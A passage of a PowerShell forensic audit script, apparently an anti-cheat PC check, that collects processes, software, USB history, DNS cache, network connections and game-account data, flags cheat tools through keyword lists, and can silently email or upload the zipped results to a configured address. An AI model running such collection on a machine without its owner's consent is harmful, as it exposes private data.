try { $tasks = Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.State -ne "Disabled" } | Select-Object TaskName, Author, @{N='Action';E={($_.Actions|Select-Object -First 1).Execute}}, @{N='Arguments';E={($_.Actions|Select-Object -First 1).Arguments}}, State } catch { $schtasks = schtasks /query /fo csv /v | ConvertFrom-Csv | Where-Object { $_.'Run As User' -ne 'N/A' }; $tasks = $schtasks | Select-Object @{N='TaskName';E={$_.TaskName}}, @{N='Author';E={$_.'Run As User'}}, @{N='Action';E={$_.'Task To Run'}}, @{N='State';E={$_.'Scheduled Task State'}} }

# AI Bot Processes - FIXED: Added null-safe checks for ProcessName, Path, Company
$aiBotProcesses = $procs | Where-Object {
    $n = if ($_.ProcessName) { $_.ProcessName.ToLower() } else { "" }
    $path = if ($_.Path) { $_.Path.ToLower() } else { "" }
    $company = if ($_.Company) { $_.Company.ToLower() } else { "" }
    $cmdLine = if ($_.CommandLine) { $_.CommandLine.ToLower() } else { "" }

    if ([string]::IsNullOrWhiteSpace($n) -and [string]::IsNullOrWhiteSpace($path) -and [string]::IsNullOrWhiteSpace($company)) { return $false }

    foreach ($sig in $aiBotSignatures) {
        if ($n -like "*$sig*" -or $path -like "*$sig*" -or $company -like "*$sig*") { return $true }
    }
    if ($n -match 'python' -and $cmdLine -match 'cv2|opencv|pyautogui|pynput|mss|pillow|numpy') { return $true }
    if ($n -match 'autohotkey|ahk') { return $true }
    return $false
}

# Python suspicious libraries
$pythonSusPaths = @("$env:LOCALAPPDATA\Programs\Python", "C:\Python*", "$env:APPDATA\Python", "$env:USERPROFILE\Anaconda3")
$pythonSusFiles = @()
foreach ($pyPath in $pythonSusPaths) {
    if (Test-Path $pyPath) {
        $pythonSusFiles += Get-ChildItem $pyPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'cv2|opencv|pyautogui|pynput|mss|pillow|numpy|tensor|torch|onnx|yolo' } | Select-Object FullName, Length, LastWriteTime, @{N='Library';E={$_.Name}}
    }
}

# Macro scripts
$macroPaths = @("$env:USERPROFILE\Documents", "$env:APPDATA", "$env:LOCALAPPDATA", "C:\Scripts")
$macroFiles = @()
foreach ($mPath in $macroPaths) {
    if (Test-Path $mPath) {
        $macroFiles += Get-ChildItem $mPath -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.ahk','.macro','.mcr','.json','.xml' -and $_.Name -match 'aim|bot|macro|recoil|trigger|spam|auto' } | Select-Object FullName, Length, LastWriteTime, Extension
    }
}

# Interception driver
$interceptionDriver = @()
try {
    $interceptionDriver = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'interception' -or $_.DisplayName -match 'interception' } | Select-Object Name, DisplayName, State, StartMode
} catch {}

# Auto tasks - FIXED: Added null-safe checks
$autoTasks = $tasks | Where-Object { 
    $tn = if ($_.TaskName) { $_.TaskName.ToLower() } else { "" }
    $act = if ($_.Action) { $_.Action.ToLower() } else { "" }
    $tn -match 'bot|macro|auto|script|python|ahk' -or $act -match 'bot|macro|auto|script|python|ahk' 
}

if ($aiBotProcesses.Count -gt 0) { Write-Alert "$($aiBotProcesses.Count) AI bot/automation processes detected!" }
if ($pythonSusFiles.Count -gt 0) { Write-Alert "$($pythonSusFiles.Count) suspicious Python libraries!" }
if ($macroFiles.Count -gt 0) { Write-Alert "$($macroFiles.Count) macro/automation scripts!" }
if ($interceptionDriver.Count -gt 0) { Write-Alert "Interception driver detected - hardware automation!" }

Write-Log "AI BOT PROCESSES ($($aiBotProcesses.Count))" $aiBotProcesses "AI_Bot_Processes"
Write-Log "PYTHON LIBRARIES ($($pythonSusFiles.Count))" $pythonSusFiles "Python_Suspicious_Libraries"
Write-Log "MACRO SCRIPTS ($($macroFiles.Count))" $macroFiles "Macro_Scripts"
Write-Log "INTERCEPTION DRIVER" $interceptionDriver "Interception_Driver"
Write-Log "AUTO TASKS ($($autoTasks.Count))" $autoTasks "Suspicious_Auto_Tasks"

# ========== SECTION 7: REGISTRY ==========
Write-Section "7: REGISTRY PERSISTENCE"

$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx"
)
$runEntries = @()
foreach ($key in $runKeys) { if (Test-Path $key) { (Get-ItemProperty $key -ErrorAction SilentlyContinue).PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' -and $_.Name -ne '(Default)' } | ForEach-Object { $runEntries += [PSCustomObject]@{Path=$key; Name=$_.Name; Value=$_.Value} } } }
Write-Log "RUN KEYS ($($runEntries.Count))" $runEntries "Registry_RunKeys"

$ifeo = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" -ErrorAction SilentlyContinue | ForEach-Object { $d=(Get-ItemProperty $_.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger; if($d){[PSCustomObject]@{Executable=$_.PSChildName; Debugger=$d}} }
if ($ifeo.Count -gt 0) { Write-Alert "IFEO Debugger hijacking detected!" }
Write-Log "IFEO DEBUGGERS ($($ifeo.Count))" $ifeo "Registry_IFEO"

$appInit = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs, LoadAppInit_DLLs -ErrorAction SilentlyContinue
if ($appInit.AppInit_DLLs -and $appInit.AppInit_DLLs -ne "") { Write-Alert "AppInit_DLLs is not empty!" }
Write-Log "APPINIT_DLLs" $appInit

# ========== SECTION 8: USB HISTORY ==========
Write-Section "8: USB FORENSICS"

$usb = @()
if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR") {
    Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR" | ForEach-Object {
        Get-ChildItem $_.PSPath | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath
            $usb += [PSCustomObject]@{DeviceID=$_.PSChildName; FriendlyName=$p.FriendlyName; Mfg=$p.Mfg; Service=$p.Service; Driver=$p.Driver}
        }
    }
}
Write-Log "USB HISTORY ($($usb.Count))" $usb "USB_History"

$usbControllers = @()
if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Enum\USB") {
    Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Enum\USB" | ForEach-Object {
        Get-ChildItem $_.PSPath -ErrorAction SilentlyContinue | ForEach-Object {
            $p = Get-ItemProperty $_.PSPath
            if ($p.FriendlyName -or $p.DeviceDesc) { $usbControllers += [PSCustomObject]@{DeviceID=$_.PSChildName; FriendlyName=$p.FriendlyName; DeviceDesc=$p.DeviceDesc; Mfg=$p.Mfg} }
        }
    }
}
Write-Log "USB CONTROLLERS ($($usbControllers.Count))" $usbControllers "USB_Controllers"

# ========== SECTION 9: SOFTWARE ==========
Write-Section "9: INSTALLED SOFTWARE"

$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation, UninstallString | Where-Object { $_.DisplayName }
Write-Log "INSTALLED PROGRAMS ($($software.Count))" $software "Installed_Software"

# ========== SECTION 10: PROCESSES ==========
Write-Section "10: RUNNING PROCESSES"

# $procs already defined above in Section 6 (FIXED)
Write-Log "RUNNING PROCESSES ($($procs.Count))" $procs "Processes"

# FIXED: Added null-safe checks for suspicious processes (same fix as line 271)
$susProcs = $procs | Where-Object { 
    $n = if ($_.ProcessName) { $_.ProcessName.ToLower() } else { "" }
    $path = if ($_.Path) { $_.Path.ToLower() } else { "" }

    if ([string]::IsNullOrWhiteSpace($n)) { return $false }

    $susNames | ForEach-Object { if($n -like "*$_*"){return $true}}
    if($path -and ($path -like "*\Temp\*" -or $path -like "*\Downloads\*")){return $true}
    if ($n -match '^[a-z0-9]{1,4}\.exe$') { return $true }
    return $false 
}
if ($susProcs.Count -gt 0) { Write-Alert "$($susProcs.Count) suspicious processes running!" }
Write-Log "SUSPICIOUS PROCESSES ($($susProcs.Count))" $susProcs "Suspicious_Processes"

# ========== SECTION 11: NETWORK ==========
Write-Section "11: NETWORK FORENSICS"

$net = @()
try { $net = Get-NetTCPConnection -ErrorAction Stop | Where-Object { $_.State -eq "Established" } | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, @{N='Process';E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}}, OwningProcess } catch { $netstat = netstat -ano | Select-String "ESTABLISHED"; $net = $netstat | ForEach-Object { $parts = ($_ -split '\s+') | Where-Object { $_ }; if ($parts.Count -ge 5) { [PSCustomObject]@{LocalAddress=$parts[1]; RemoteAddress=$parts[2]; State="ESTABLISHED"; OwningProcess=$parts[4]; Process=(Get-Process -Id $parts[4] -ErrorAction SilentlyContinue).ProcessName} } } }
Write-Log "ACTIVE CONNECTIONS ($($net.Count))" $net "Network_Connections"

$dnsCache = Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object Entry, RecordName, RecordType, Status, Section, TimeToLive
Write-Log "DNS CACHE" $dnsCache "DNS_Cache"

# ========== SECTION 12: SCHEDULED TASKS ==========
Write-Section "12: SCHEDULED TASKS"

# $tasks already defined above in Section 6 (FIXED)
Write-Log "SCHEDULED TASKS ($($tasks.Count))" $tasks "Scheduled_Tasks"

# ========== SECTION 13: TEMP FILES ==========
Write-Section "13: TEMP FILES & RECENT ACTIVITY"

$tempFiles = @()
@($env:TEMP, "C:\Windows\Temp", "C:\Temp") | ForEach-Object { if (Test-Path $_) { $tempFiles += Get-ChildItem $_ -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } | Select-Object FullName, Length, LastWriteTime, @{N='Extension';E={$_.Extension}} } }
Write-Log "RECENT TEMP FILES (7 days)" $tempFiles "Temp_Files"

# ========== SECTION 14: GAME SCAN ==========
Write-Section "14: GAME FILES & MODIFICATIONS"

$defaultGamePaths = @(
    "C:\Program Files (x86)\Steam\steamapps\common", "C:\Program Files\Steam\steamapps\common", "$env:USERPROFILE\Steam\steamapps\common",
    "C:\Program Files\Epic Games", "C:\Program Files (x86)\Epic Games", "C:\Program Files\EA Games", "C:\Program Files (x86)\EA Games",
    "C:\Program Files\Ubisoft", "C:\Program Files (x86)\Ubisoft", "C:\Riot Games", "C:\Program Files\Riot Games",
    "$env:LOCALAPPDATA\VALORANT", "$env:LOCALAPPDATA\FortniteGame", "$env:LOCALAPPDATA\PUBG",
    "C:\Program Files (x86)\Battle.net", "C:\Program Files\Battle.net", "C:\XboxGames",
    "$env:USERPROFILE\Documents\My Games", "C:\Program Files (x86)\Steam\userdata", "$env:APPDATA\.minecraft",
    "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe"
)
if ($GamePaths) { $defaultGamePaths += $GamePaths -split ';' }

$gameFiles = @()
foreach ($path in $defaultGamePaths) { if (Test-Path $path) { $gameFiles += Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.dll','.exe','.sys','.ini','.cfg','.json','.pak','.ucas','.utoc' } | Select-Object FullName, Length, LastWriteTime, Extension, @{N='GameDir';E={$path}} } }
Write-Log "GAME FILES ($($gameFiles.Count))" $gameFiles "Game_Files"

$susGameFiles = $gameFiles | Where-Object { $name = (Split-Path $_.FullName -Leaf).ToLower(); $susNames | ForEach-Object { if($name -like "*$_*"){return $true}}; if ($name -match 'inject|hook|detour|minhook|scylla|x64dbg|cheat|hack|aim|esp|wall|radar|trigger|bot|macro|script|lua|pak|ucas|utoc') { return $true }; return $false }
if ($susGameFiles.Count -gt 0) { Write-Alert "$($susGameFiles.Count) suspicious files in game directories!" }
Write-Log "SUSPICIOUS GAME FILES ($($susGameFiles.Count))" $susGameFiles "Suspicious_Game_Files"

# ========== SECTION 15: THREAT HUNT ==========
Write-Section "15: SYSTEM WIDE THREAT HUNT"

$foundFiles = @()
$searchPaths = @($env:USERPROFILE, $env:LOCALAPPDATA, $env:APPDATA, $env:PROGRAMDATA, "C:\ProgramData")
$searchExts = '.exe','.dll','.sys','.bat','.cmd','.ps1','.ahk','.lua','.vbs','.js','.jar','.py','.scr','.com'
foreach ($dir in $searchPaths) {
    if (Test-Path $dir) {
        foreach ($ext in $searchExts) {
            $foundFiles += Get-ChildItem $dir -Filter "*$ext" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $name = $_.Name.ToLower(); foreach ($s in $susNames) { if ($name -like "*$s*") { return $true } }; if ($name -match '^[a-z0-9]{1,4}\.(exe|dll|sys)$') { return $true }; if ($name -match 'inject|loader|map|unmap|hook|detour|minhook|scylla') { return $true }; return $false } | Select-Object FullName, Length, LastWriteTime, @{N='SHA256';E={(Get-FileHash $_.FullName -Algorithm SHA256 -ErrorAction SilentlyContinue).Hash}}
        }
    }
}
if ($foundFiles.Count -gt 0) { Write-Alert "$($foundFiles.Count) suspicious files found system wide!" }
Write-Log "SUSPICIOUS FILES ($($foundFiles.Count))" $foundFiles "Suspicious_Files"

# ========== SECTION 16: DRIVERS ==========
Write-Section "16: DRIVER SECURITY"

$drivers = @()
try {
    $drivers = Get-WindowsDriver -Online -All -ErrorAction Stop | Select-Object Driver, OriginalFileName, ProviderName, Date, Version, BootCritical, @{N='ClassName';E={$_.ClassName}}, @{N='ClassDescription';E={$_.ClassDescription}}, @{N='Signer';E={$_.SignerName}}, @{N='IsSigned';E={if($_.SignerName -and $_.SignerName -notmatch 'Not signed|Unknown'){$true}else{$false}}}
} catch {
    $driverPath = "C:\Windows\System32\drivers"
    $drivers = Get-ChildItem $driverPath -Filter "*.sys" -ErrorAction SilentlyContinue | Select-Object Name, @{N='FullPath';E={$_.FullName}}, Length, LastWriteTime, @{N='IsSigned';E={ $sig = Get-AuthenticodeSignature $_.FullName -ErrorAction SilentlyContinue; if ($sig.Status -eq 'Valid') { $true } else { $false } }}, @{N='SignatureStatus';E={ $sig = Get-AuthenticodeSignature $_.FullName -ErrorAction SilentlyContinue; $sig.Status }}
}
Write-Log "ALL DRIVERS ($($drivers.Count))" $drivers "Drivers"

$unsignedDrivers = $drivers | Where-Object { if ($_.IsSigned -eq $false) { return $true }; if ($_.SignatureStatus -and $_.SignatureStatus -notmatch 'Valid|Microsoft|Intel|AMD|NVIDIA|Realtek|Broadcom|Qualcomm') { return $true }; return $false }
if ($unsignedDrivers.Count -gt 0) { Write-Alert "$($unsignedDrivers.Count) unsigned or suspicious drivers!" }
Write-Log "UNSIGNED DRIVERS ($($unsignedDrivers.Count))" $unsignedDrivers "Unsigned_Drivers"

# ========== SECTION 17: WMI ==========
Write-Section "17: WMI PERSISTENCE"

$wmiBindings = @(); try { $wmiBindings = Get-CimInstance __FilterToConsumerBinding -Namespace root/subscription -ErrorAction Stop } catch { $wmiBindings = Get-WmiObject __FilterToConsumerBinding -Namespace root/subscription -ErrorAction SilentlyContinue }
if ($wmiBindings.Count -gt 0) { Write-Alert "WMI event bindings found!" }
Write-Log "WMI BINDINGS ($($wmiBindings.Count))" $wmiBindings "WMI_Bindings"

$wmiFilters = @(); try { $wmiFilters = Get-CimInstance __EventFilter -Namespace root/subscription -ErrorAction Stop | Select-Object Name, Query, QueryLanguage } catch { $wmiFilters = Get-WmiObject __EventFilter -Namespace root/subscription -ErrorAction SilentlyContinue | Select-Object Name, Query, QueryLanguage }
Write-Log "WMI FILTERS ($($wmiFilters.Count))" $wmiFilters "WMI_Filters"

$wmiConsumers = @(); try { $wmiConsumers = Get-CimInstance __EventConsumer -Namespace root/subscription -ErrorAction Stop | Select-Object Name, @{N='Type';E={$_.__CLASS}}, CommandLineTemplate } catch { $wmiConsumers = Get-WmiObject __EventConsumer -Namespace root/subscription -ErrorAction SilentlyContinue | Select-Object Name, @{N='Type';E={$_.__CLASS}}, CommandLineTemplate }
Write-Log "WMI CONSUMERS ($($wmiConsumers.Count))" $wmiConsumers "WMI_Consumers"

# ========== SECTION 18: ADS ==========
Write-Section "18: ALTERNATE DATA STREAMS"

$adsFiles = @()
$scanPaths = @($env:USERPROFILE, $env:TEMP, "$env:LOCALAPPDATA", "C:\Users")
foreach ($path in $scanPaths) {
    if (Test-Path $path) {
        try {
            $cmdOutput = cmd /c "dir `"$path`" /s /r 2>nul" | Select-String ":\$"
            foreach ($line in $cmdOutput) {
                if ($line -match '^\s+(\d+)\s+(.+):(.+)$') {
                    $adsFiles += [PSCustomObject]@{ FileName = $Matches[2].Trim(); StreamName = $Matches[3].Trim(); Size = $Matches[1]; DetectionMethod = "cmd-dir-r" }
                }
            }
        } catch {}
    }
}
$adsFiles = $adsFiles | Where-Object { $_.StreamName -ne '' -and $_.StreamName -notmatch '^\s*$' } | Sort-Object FileName, StreamName -Unique
if ($adsFiles.Count -gt 0) { Write-Alert "$($adsFiles.Count) alternate data streams found!" }
Write-Log "ADS STREAMS ($($adsFiles.Count))" $adsFiles "ADS_Files"

# ========== SECTION 19: RAINBOW SIX SIEGE STATS ==========
Write-Section "19: RAINBOW SIX SIEGE PLAYER STATS"

if (-not $Silent) { Write-Host "`n[*] Scanning for Rainbow Six Siege accounts..." -ForegroundColor Cyan }

$r6sAccounts = Find-R6SAccounts

# Build formatted R6S stats text for log
$r6sStatsText = @"

========================================================================
RAINBOW SIX SIEGE PLAYER STATS
========================================================================

"@

if ($r6sAccounts.Count -eq 0) {
    $r6sStatsText += "No Rainbow Six Siege accounts found on this system.`n"
    $r6sStatsText += "Checked: R6S save data, Ubisoft Connect registry, browser data, Discord cache, media folders.`n"
    Write-Warn "No Rainbow Six Siege accounts found on this system."
    Write-Log "R6S ACCOUNTS" "No accounts discovered."
} else {
    if (-not $Silent) { Write-Host "[+] Found $($r6sAccounts.Count) potential account(s): $($r6sAccounts -join ', ')" -ForegroundColor Green }

    $allR6SStats = @()
    $firstAccount = $true

    foreach ($account in $r6sAccounts) {
        if (-not $Silent) { Write-Host "[*] Querying stats for: $account ..." -ForegroundColor Cyan }

        $stats = Get-R6SPlayerStats -Username $account

        if ($stats -and $stats.Count -gt 0) {
            foreach ($stat in $stats) {
                if (-not $firstAccount) {
                    $r6sStatsText += "--------------------------------------------`n`n"
                }
                $firstAccount = $false

                $r6sStatsText += "Username: $($stat.Username)`n"
                $r6sStatsText += "Platform: $($stat.Platform.ToUpper())`n"
                $r6sStatsText += "Level: $($stat.Level)`n"
                $r6sStatsText += "Rank: $($stat.Rank)`n"
                $r6sStatsText += "MMR: $($stat.MMR)`n"
                $r6sStatsText += "KD: $($stat.KD)`n"
                $r6sStatsText += "Win Rate: $($stat.WinRate)`n"
                $r6sStatsText += "Wins: $($stat.Wins)`n"
                $r6sStatsText += "Losses: $($stat.Losses)`n"
                $r6sStatsText += "Kills: $($stat.Kills)`n"
                $r6sStatsText += "Deaths: $($stat.Deaths)`n"
                $r6sStatsText += "Headshots: $($stat.Headshots)`n"
                $r6sStatsText += "Time Played: $($stat.TimePlayed)`n"
                $r6sStatsText += "Profile: $($stat.ProfileURL)`n"
                $r6sStatsText += "Status: $($stat.API_Status)`n"
                $r6sStatsText += "`n"

                $allR6SStats += $stat
                if (-not $Silent) { Write-Host "[+] Found stats for $account on $($stat.Platform)" -ForegroundColor Green }
            }
        } else {
            if (-not $firstAccount) {
                $r6sStatsText += "--------------------------------------------`n`n"
            }
            $firstAccount = $false

            $r6sStatsText += "Username: $account`n"
            $r6sStatsText += "Platform: N/A`n"
            $r6sStatsText += "Level: N/A`n"
            $r6sStatsText += "Rank: N/A`n"
            $r6sStatsText += "MMR: N/A`n"
            $r6sStatsText += "KD: N/A`n"
            $r6sStatsText += "Win Rate: N/A`n"
            $r6sStatsText += "Status: Not Found`n"
            $r6sStatsText += "Search: https://r6.tracker.network/search?platform=pc&query=$account`n"
            $r6sStatsText += "`n"

            $allR6SStats += [PSCustomObject]@{
                Username = $account
                Platform = "N/A"
                Level = "N/A"
                Rank = "N/A"
                MMR = "N/A"
                KD = "N/A"
                WinRate = "N/A"
                Wins = "N/A"
                Losses = "N/A"
                Kills = "N/A"
                Deaths = "N/A"
                Headshots = "N/A"
                TimePlayed = "N/A"
                ProfileURL = "https://r6.tracker.network/search?platform=pc&query=$account"
                API_Status = "Not Found"
                LastUpdated = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            }
            if (-not $Silent) { Write-Host "[-] No stats found for $account" -ForegroundColor Yellow }
        }

        Start-Sleep -Milliseconds 500  # Rate limit protection
    }

    $r6sStatsText += "========================================================================`n"
    $r6sStatsText += "Total Accounts Checked: $($r6sAccounts.Count)`n"
    $r6sStatsText += "Stats Found: $(($allR6SStats | Where-Object { $_.API_Status -like 'Success*' } | Measure-Object | Select-Object -ExpandProperty Count))`n"
    $r6sStatsText += "Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")`n"
    $r6sStatsText += "========================================================================`n"

    # Write to log file
    Add-Content -Path $LogFile -Value $r6sStatsText -ErrorAction SilentlyContinue

    # Also export to CSV
    $allR6SStats | Export-Csv -Path "$CsvFolder\R6S_Player_Stats.csv" -NoTypeInformation -Force -ErrorAction SilentlyContinue
}

# ========== SUMMARY ==========
Write-Section "FINAL SUMMARY"

# Build summary safely
$installDateStr = if ($osInfo.'Install Date') { $osInfo.'Install Date' } else { "Unknown" }
$uptimeStr = if ($osInfo.'System Uptime') { $osInfo.'System Uptime' } else { "Unknown" }
$daysInstall = if ($osInfo.'Days Since Install') { $osInfo.'Days Since Install'.ToString() } else { "?" }

$summaryText = @"
AUDIT COMPLETE: $(Get-Date)
Log: $LogFile
CSV: $CsvFolder
Prefetch: $PrefetchFolder

WINDOWS INSTALL DATE: $installDateStr ($daysInstall days ago)
SYSTEM UPTIME: $uptimeStr

DEVICES:
  USB: $($pluggedUSB.Count) | HID: $($hidDevices.Count) | Audio: $($audioDevices.Count)
  Monitors: $($monitors.Count) | Storage: $($storage.Count) | Network: $($netAdapters.Count)
  Bluetooth: $($bluetooth.Count) | PCIe/DMA: $($pcieDevices.Count) | Serial: $($serialPorts.Count)
  Total PNP: $($allPnp.Count)

FORENSICS:
  Prefetch: $($prefetch.Count) | USB History: $($usb.Count) | Software: $($software.Count)
  Processes: $($procs.Count) | Connections: $($net.Count) | Tasks: $($tasks.Count)

THREATS:
  Suspicious Prefetch: $($susPrefetch.Count) | Weird Names: $($weirdPrefetch.Count)
  AI Bot Processes: $($aiBotProcesses.Count) | Python Libs: $($pythonSusFiles.Count)
  Macro Scripts: $($macroFiles.Count) | Suspicious Procs: $($susProcs.Count)
  Suspicious Files: $($foundFiles.Count) | Game Files: $($gameFiles.Count)
  Suspicious Game: $($susGameFiles.Count) | Unsigned Drivers: $($unsignedDrivers.Count)
  WMI Bindings: $($wmiBindings.Count) | ADS Streams: $($adsFiles.Count)

RAINBOW SIX SIEGE:
  Accounts Discovered: $($r6sAccounts.Count)
  Accounts: $($r6sAccounts -join ', ')
  Stats Queried: $(if ($allR6SStats) { $allR6SStats.Count } else { 0 })
"@
Add-Content -Path $LogFile -Value "`n$summaryText" -ErrorAction SilentlyContinue
# ========== ZIP ==========
$zipPath = "$OutputPath\Audit_$Timestamp.zip"
if ($ZipResults) {
    try {
        Compress-Archive -Path $LogFile, $CsvFolder, $PrefetchFolder -DestinationPath $zipPath -Force -ErrorAction Stop
        Write-Log "ZIP ARCHIVE CREATED" "Location: $zipPath"
        if (-not $Silent) { Write-Host "ZIP: $zipPath" -ForegroundColor Green }
    } catch {
        Write-Log "ZIP FAILED" $_.Exception.Message
    }
}

# ========== EMAIL ==========
if ($EmailTo -and $EmailFrom -and $EmailPassword -and -not $NoEmail) {
    try {
        $subject = "System Audit - $env:COMPUTERNAME - $Timestamp"
        $body = "Audit for $env:COMPUTERNAME`n`n$summaryText"
        $securePassword = ConvertTo-SecureString $EmailPassword -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($EmailFrom, $securePassword)

        $params = @{
            SmtpServer = $SMTPServer
            Port = $SMTPPort
            UseSsl = $true
            Credential = $credential
            From = $EmailFrom
            To = $EmailTo
            Subject = $subject
            Body = $body
        }

        if ($ZipResults -and (Test-Path $zipPath)) {
            $params.Attachments = $zipPath
        } elseif (Test-Path $LogFile) {
            $params.Attachments = $LogFile
        }

        Send-MailMessage @params -ErrorAction Stop
        Write-Log "EMAIL SENT" "To: $EmailTo"
        if (-not $Silent) { Write-Host "Email sent to $EmailTo!" -ForegroundColor Green }
    } catch {
        Write-Log "EMAIL FAILED" $_.Exception.Message
        if (-not $Silent) { Write-Host "Email failed: $($_.Exception.Message)" -ForegroundColor Red }
    }
}

# ========== UPLOAD ==========
if ($UploadURL) {
    try {
        $uploadFile = if ($ZipResults -and (Test-Path $zipPath)) { $zipPath } else { $LogFile }
        Invoke-RestMethod -Uri $UploadURL -Method Post -InFile $uploadFile -Headers @{"Content-Type"="application/octet-stream"} -ErrorAction Stop
        Write-Log "UPLOAD SUCCESS" $UploadURL
        if (-not $Silent) { Write-Host "Uploaded!" -ForegroundColor Green }
    } catch {
        Write-Log "UPLOAD FAILED" $_.Exception.Message
    }
}

# ========== CONSOLE OUTPUT ==========
if (-not $Silent) {
    Write-Host "`n================================================================" -ForegroundColor Green
    Write-Host "  AUDIT COMPLETE v6.2" -ForegroundColor Green
    Write-Host "================================================================" -ForegroundColor Green
    Write-Host "  Windows: $installDateStr ($daysInstall days)" -ForegroundColor Cyan
    Write-Host "  Devices: $($allPnp.Count) total PNP | Prefetch: $($prefetch.Count) files" -ForegroundColor Cyan
    Write-Host "  AI Bots: $($aiBotProcesses.Count) detected | Threats: $($susProcs.Count + $foundFiles.Count + $susGameFiles.Count)" -ForegroundColor Cyan
    Write-Host "  R6S Accounts: $($r6sAccounts.Count) found | Stats Queried: $(if ($allR6SStats) { $allR6SStats.Count } else { 0 })" -ForegroundColor Cyan
    Write-Host "  Log: $LogFile" -ForegroundColor Cyan
    if ($ZipResults -and (Test-Path $zipPath)) { Write-Host "  ZIP: $zipPath" -ForegroundColor Cyan }
    Write-Host "================================================================" -ForegroundColor Green
}
